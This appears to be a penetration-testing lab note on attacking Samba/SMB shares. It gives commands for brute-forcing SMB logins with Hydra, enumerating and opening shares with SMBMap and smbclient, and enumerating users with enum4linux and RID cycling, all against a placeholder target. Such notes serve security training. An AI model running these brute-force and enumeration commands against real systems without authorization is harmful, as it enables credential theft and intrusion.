# Exploiting SAMBA

* SMB is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).
* SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
* Samba is the Linux implementation of SMB,and allows Windows systems to access Linux shares and devices.
* Samba utilizes username and password authentication in order to obtain acacess to the server or a network share.
* After obtaining legitimate credentials, we can use SMBMap in order to enumerate SAMBA share drives, list the contents of the shares as well as download files and execute remote commands on the target.
* We can also use smbclient. It communicated with a LAN manager server, and can be used to download files from the server to the local machine.

## Practice Demo

Enumerate target

In this case it is running Samba on ports 139 and 445

We will perform brute force using Hydra

* <mark style="color:yellow;">hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix\_password.txt targetIP smb</mark>

### Using SMBMap

This is a Samba share enumerator

To enumerate run:

* <mark style="color:yellow;">smbmap -H targetIP -u admin -p password</mark>

#### Listing the  shares:

* <mark style="color:yellow;">smbclient -L targetIP -U admin</mark>

Gaining access to the interface:

* <mark style="color:yellow;">smbclient //targetIP/'nameofshare' -U admin</mark>

### enum4linux

It is an enumeration tool for Samba.

* <mark style="color:yellow;">enum4linux -a targetIP</mark>
  * "<mark style="color:red;">-a</mark>": All information

Enumerate with credentials:

* <mark style="color:yellow;">"enum4linux -a -u admin -p password1 targetIP</mark>"

#### Using enum4linux with RID Cycling

RID cycling is an enumeration technique to brute force the RID to SID mappings of users.

* <mark style="color:yellow;">enum4linux -u \[username] -p \[password] -U \[target IP]</mark>

After we get the RIDs, which will be in hexadecimal we have to convert them and to get te SIDs we append the RID to the Domain Sid.
